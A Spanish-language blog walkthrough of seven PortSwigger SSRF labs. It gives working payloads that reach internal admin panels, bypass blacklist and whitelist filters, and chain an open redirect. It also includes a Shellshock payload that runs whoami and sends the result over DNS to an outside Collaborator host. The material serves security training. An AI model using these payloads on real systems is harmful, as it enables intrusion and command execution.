---
title: üåê SSRF
categories: [Vulnerabilidades]
image: "/assets/img/ssrf.png"
description: "Sever-Side Request Forgery attack"
---

# üåê **Sever-Side Request Forgery (SSRF)**

Explicaci√≥n acerca de Server-Side Request Forgery (SSRF)

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/img/ssrf.png" width="300"/>
  <p style="font-style: italic; margin-top: 8x;">Copyright ¬© 2010-2025 Freepik Company S.L.</p>
</div>

# üí°**¬øQu√© es el SSRF?**

Un **Server-Side Request Forgery (SSRF)** ocurre cuando una aplicaci√≥n web permite que un atacante haga que el **servidor** realice peticiones HTTP hacia un destino elegido por el atacante.  
En lugar de que tu navegador ejecute la petici√≥n, **es el servidor quien la ejecuta**.

¬øPor qu√© es peligroso?

El servidor suele tener acceso a recursos que un usuario externo normalmente no podr√≠a alcanzar, como:

- **Recursos internos** de la red no accesibles desde fuera.  
  Ejemplo:  
  - `http://localhost:8080`  
  - `http://intranet/`  
  - `http://169.254.169.254/` (metadatos en entornos cloud).  

- **Servicios privados** como:  
  - Bases de datos.  
  - Paneles de administraci√≥n.  
  - APIs internas.  

- **Otros servidores**, pudiendo usarse como pivot para:  
  - Escaneo de red.  
  - Explotaci√≥n de servicios vulnerables internos.  

En esta secci√≥n del blog utilizaremos los laboratorios de PortSwigger para explicar, paso a paso, los distintos escenarios en los que puede producirse SSRF.

---

# üß™**Laboratorios**

En caso de que quer√°is ver la resoluci√≥n directa de alg√∫n laboratorio, pod√©is utilizar el siguiente √≠ndice:

- [Lab 1](#lab-1): Basic SSRF against the local server
- [Lab 2](#lab-2): Basic SSRF against another back-end system
- [Lab 3](#lab-3): Basic SSRF against another back-end system
- [Lab 4](#lab-4): SSRF with blacklist-based input filter
- [Lab 5](#lab-5): SSRF with filter bypass via open redirection vulnerability
- [Lab 6](#lab-6): Blind SSRF with Shellshock exploitation
- [Lab 7](#lab-7): SSRF with whitelist-based input filter

---

Dado que los ataques **SSRF** no se clasifican estrictamente en grupos, sino m√°s bien en diferentes formas de enfoque, abordaremos la resoluci√≥n de los laboratorios de manera progresiva.

---

## Lab 1

**SSRF b√°sico contra el servidor local**

En este laboratorio, al igual que suceder√° en muchos otros de esta secci√≥n, se nos solicita obtener acceso al panel de administraci√≥n y eliminar al usuario Carlos de la p√°gina web.

En este caso, la p√°gina web dispone de funcionalidades muy limitadas, siendo la principal la posibilidad de consultar el stock de un producto.

Al interceptar dicha petici√≥n con BurpSuite, se observa lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/ssrf/ssrf-1.png" width="1000"/>
</div>

Al final del an√°lisis se observa que se est√°n tramitando datos mediante el par√°metro stockApi hacia una direcci√≥n URL de forma directa.  

Si, por ejemplo, indicamos la direcci√≥n http://google.com y enviamos la petici√≥n, comprobamos que efectivamente somos redirigidos a Google. Esto confirma que el servidor est√° realizando las peticiones en nuestro lugar.  

De este modo, si modificamos la petici√≥n para que apunte a http://localhost/admin, se puede verificar que se carga correctamente el panel de administraci√≥n.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/ssrf/ssrf-2.png" width="1000"/>
</div>

Como se puede observar, el bot√≥n de eliminar corresponde a un hiperv√≠nculo. Al revisar el c√≥digo fuente de la p√°gina se identifica que este apunta a la ruta `/admin/delete?username=carlos`.  

Por lo tanto, si tramitamos una petici√≥n utilizando el par√°metro stockApi hacia la direcci√≥n `http://localhost/admin/delete?username=carlos`, conseguiremos completar el laboratorio, ya que se elimina al usuario Carlos.

## Lab 2

**SSRF b√°sico contra otro servidor back-end**

Una vez m√°s se nos solicita acceder al panel de administraci√≥n y eliminar al usuario Carlos.  

En este caso se indica que el panel se encuentra en la direcci√≥n IP `192.168.0.X:8080`, donde el √∫ltimo octeto es desconocido.  

Si volvemos a consultar el stock de un producto y capturamos la petici√≥n con BurpSuite, observamos nuevamente el par√°metro stockApi realizando una llamada a una URL, de forma similar al laboratorio anterior.  

En este escenario, lo que podemos hacer es establecer en el par√°metro la direcci√≥n `http://192.168.0.X:8080` y enviar la petici√≥n al m√≥dulo Intruder para averiguar el √∫ltimo octeto. De este modo, se procede a descubrir la direcci√≥n completa del panel de administraci√≥n.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/ssrf/ssrf-3.png" width="1000"/>
</div>

Al iniciar el ataque, se observa que el servidor cuyo √∫ltimo octeto es 118 devuelve una respuesta diferente al resto de los servidores, lo que nos permite inferir que esa es la direcci√≥n correcta.  

Por lo tanto, si tramitamos una petici√≥n mediante el par√°metro stockApi hacia `http://192.168.0.118:8080/admin/delete?username=carlos`, se eliminar√° el usuario Carlos y se completar√° el laboratorio.

# Lab 3

**SSRF ciego con detecci√≥n fuera de banda**

En este caso se indica que el servidor hace uso de la cabecera `Referer` para realizar an√°lisis sobre la web, por lo que podemos deducir que esta URL debe ser interpretada. Para completar el laboratorio, se solicita enviar una petici√≥n a un servidor del Burp Collaborator.  

Si nos dirigimos a la p√°gina inicial e interceptamos una recarga, podemos observar el encabezado `Referer`. Podemos probar colocando directamente la direcci√≥n URL del Burp Collaborator, por ejemplo: `Referer: https://0abmuswu9df8ca18assltggnmes5gv4k.oastify.com`.  

Al revisar BurpSuite, podemos confirmar que hemos recibido correctamente la petici√≥n HTTP.

# Lab 4

**SSRF con filtro de entrada basado en una lista negra**

Una vez m√°s se nos solicita acceder al panel de administraci√≥n y eliminar al usuario Carlos.  

En este caso se indica que el panel se encuentra en la direcci√≥n `http://localhost/admin`.

Si volvemos a consultar el stock de un producto y capturamos la petici√≥n con BurpSuite, observamos nuevamente el par√°metro `stockApi` realizando una llamada a una URL, de forma similar a laboratorios anteriores.  

No obstante, si probamos enviar la petici√≥n directamente a `http://localhost/admin`, no obtenemos ninguna respuesta. Se pueden intentar diferentes formas de representar `localhost`, como `127.0.0.1`, en hexadecimal o en decimal, pero ninguna de estas resulta efectiva. Sin embargo, los ceros pueden omitirse, permitiendo referirse a `localhost` como `127.1`.  

En este caso, al enviar la petici√≥n a `http://127.1`, no se produce error, pero al a√±adir `/admin` deja de cargar. Una opci√≥n es url-encodear la barra `/` como `%2F`, pero enviar la petici√≥n `http://127.1%2Fadmin` tampoco funciona. Esto probablemente se deba a que el servidor, al hacer el URL-decode, interpreta la ruta como `http://127.1/admin` y la deniega.  

Una soluci√≥n es url-encodear el car√°cter `%` para que al decodificar la URL el servidor no detecte directamente la ruta `/admin`, pero a√∫n as√≠ se acceda al panel. Por ejemplo, enviar:  
```bash
stockApi=http://127.1/%2561dmin
```

De esta manera podemos visualizar el panel y, finalmente, eliminar al usuario Carlos enviando la petici√≥n:  
```bash
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

# Lab 5

**SSRF con omisi√≥n del filtro a trav√©s de una vulnerabilidad de redireccionamiento abierto**

Una vez m√°s se nos solicita acceder al panel de administraci√≥n y eliminar al usuario Carlos.  

En este caso se indica que el panel se encuentra en la direcci√≥n `http://192.168.0.12:8080/admin`.

Si volvemos a interceptar la consulta del stock de un producto, observamos que el par√°metro `stockApi` ya no realiza la petici√≥n a una URL directa, sino que apunta a una ruta interna `stockApi=/product/stock/check?productId=2&storeId=1`.

Si intentamos aplicar los m√©todos de laboratorios anteriores, comprobamos que ninguno funciona en este caso.  

Al explorar un poco m√°s la web, notamos que dentro de un producto existe una opci√≥n para ir al siguiente. Al interceptar esta petici√≥n, se puede observar lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/ssrf/ssrf-4.png" width="1000"/>
</div>

Si en el par√°metro `path` colocamos la ruta a la ra√≠z, por ejemplo `http://....web-security-academy.net`, y enviamos la petici√≥n, observamos que se nos redirige correctamente a esa URL. Esto puede hacer pensar que si colocamos `http://192.168.0.12:8080/admin` tambi√©n deber√≠amos ser redirigidos al panel de administraci√≥n; sin embargo, esto no ocurre.  

Al analizar con detalle, tanto la ruta para ver el stock de un producto como la de ‚Äúnext product‚Äù parten del directorio `/product`. Esto indica que las peticiones se realizan al mismo nivel de directorio.  

Por lo tanto, podemos modificar la petici√≥n de `stockApi` para que, en lugar de ir a `/product/stock`, se dirija a `/product/nextProduct?currentProductId=5&path=` y, en el par√°metro `path`, colocar `http://192.168.0.12:8080/admin`. Esto se ver√≠a de la siguiente manera:  
```bash
stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12:8080/admin
```

De esta forma, se puede visualizar el panel de administraci√≥n y eliminar al usuario Carlos mediante:  
```bash
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

# Lab 6

**SSRF con explotaci√≥n Shellshock**

En este caso se nos indica que, mediante la vulnerabilidad Shellshock, debemos obtener el nombre del usuario que est√° ejecutando un servidor en la direcci√≥n IP `192.168.0.X`, donde nuevamente el √∫ltimo octeto es desconocido.  

La vulnerabilidad Shellshock se presenta en versiones antiguas de Bash y siempre que se interpreten los headers de una solicitud. Su explotaci√≥n suele ser m√°s casual y espont√°nea, pero en este laboratorio se nos indica que est√° presente, por lo que podemos proceder directamente.  

Esta vulnerabilidad suele encontrarse en el header `User-Agent`, ya que es una cabecera que com√∫nmente es procesada por el servidor. No se explicar√° c√≥mo se produce la vulnerabilidad, solo c√≥mo explotarla. Para ello se utiliza el siguiente payload:  
```bash
() {:;}; <comando a ejecutar>
```

En este caso, queremos obtener el nombre del usuario, es decir, ejecutar el comando `whoami`. Para exfiltrar estos datos y visualizarlos, usamos el siguiente payload:  
```bash
() {:;}; /usr/bin/nslookup $(whoami).5gml8slsilct0ngduilignxha8gz4ssh.oastify.com
```


Con esto ejecutamos el comando `whoami` y a√±adimos su resultado como subdominio de un servidor Burp Collaborator. De esta forma, recibimos en nuestro Burp Collaborator una petici√≥n donde la primera parte del subdominio corresponde al nombre del usuario.  

Sin embargo, con esto solo no es suficiente, ya que no sabemos cu√°l servidor es vulnerable. Para identificarlo, utilizamos nuevamente la cabecera `Referer` y el m√≥dulo Intruder, colocando la direcci√≥n `http://192.168.0.X` y probando mediante fuerza bruta hasta identificar qu√© servidor responde. Este procedimiento se ejecuta de la siguiente manera:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/ssrf/ssrf-5.png" width="1000"/>
</div>

Al revisar Burp Collaborator, observamos el siguiente mensaje:

    The Collaborator server received a DNS lookup of type A for the domain name peter-d7uiKh.q1s6td6d36xel81yf36318i2vt1kpfd4.oastify.com


De esto podemos deducir que el nombre del usuario que est√° ejecutando el servidor es `peter-d7uiKh`.

# Lab 7

**SSRF con filtro de entrada basado en lista blanca**

Una vez m√°s se nos solicita acceder al panel de administraci√≥n y eliminar al usuario Carlos.  

En este caso se indica que el panel se encuentra en la direcci√≥n `http://localhost/admin`.

Al interceptar la consulta del stock de un producto, volvemos a observar que existe un par√°metro `stockApi` encargado de proporcionar esta informaci√≥n. Si intentamos aplicar cualquiera de las t√©cnicas de laboratorios anteriores, nos damos cuenta de que ninguna funciona.  

Al experimentar con el comportamiento de la p√°gina, se muestra el siguiente error:  

    External stock check host must be stock.weliketoshop.net


Esto indica que se realiza una comprobaci√≥n para verificar si la cadena `stock.weliketoshop.net` est√° presente en la API enviada.  

En este punto, se pueden considerar dos aspectos: 1) la posibilidad de autenticaci√≥n mediante la URL y 2) el uso del car√°cter `#` para redireccionamiento como si fuera un √≠ndice.  

Si realizamos una petici√≥n al par√°metro `stockApi` con el siguiente valor:  
```bash
stockApi=http://test:test@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

observamos que la petici√≥n fluye sin problemas, lo que indica que este formato es v√°lido.  

Antes de esto, se puede probar el uso del car√°cter `#`. Por ejemplo:  
```bash
stockApi=http://localhost:80#stock.weliketoshop.net
```


En este caso, aunque la cadena `stock.weliketoshop.net` est√° presente, va despu√©s del `#`, por lo que se interpreta como un identificador de secci√≥n (`id`) de la URL principal (`localhost:80`) y no como una direcci√≥n v√°lida. Al enviar esta petici√≥n, el mismo error vuelve a aparecer.  

Sin embargo, al a√±adir un `@` despu√©s del `#`, la situaci√≥n cambia:  
```bash
stockApi=http://localhost:80#@stock.weliketoshop.net
```

La petici√≥n se procesa correctamente y no vemos el error. Esto se debe a que el servidor no solo verifica la presencia de la cadena, sino tambi√©n que sea una URL v√°lida. La URL `http://algo:algo@stock.weliketoshop.net` se considera v√°lida como autenticaci√≥n, mientras que `http://localhost:80#@stock.weliketoshop.net` permite que la parte derecha del `#` se interprete como un identificador, evadiendo la validaci√≥n directa de la URL. No obstante, para que esto funcione correctamente, es necesario url-encodear tanto el car√°cter `#` como el `%` del `#`. Es decir, el payload final ser√≠a:  
```bash
stockApi=http://localhost:80%2523@stock.weliketoshop.net
```

Esto podr√≠a sugerir que si colocamos algo como `http://localhost:80/admin#@stock.weliketoshop.net` podr√≠a funcionar. Sin embargo, la barra `/` rompe la estructura v√°lida para autenticaci√≥n mediante URL, por lo que debemos buscar otra manera.  

Si probamos con la siguiente URL, url-encodeada:  
```bash
http://localhost:80%2523@stock.weliketoshop.net/admin
```

ahora s√≠ podemos visualizar el panel de administraci√≥n. Esto ocurre porque la parte despu√©s del `#` se ignora hasta que aparece una `/`. De esta manera, la validaci√≥n comprueba la presencia de `stock.weliketoshop.net`, pero la interpretaci√≥n final de la URL se realiza como `http://localhost:80/admin`.  

Finalmente, para eliminar al usuario Carlos, se env√≠a la siguiente solicitud:  
```bash
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```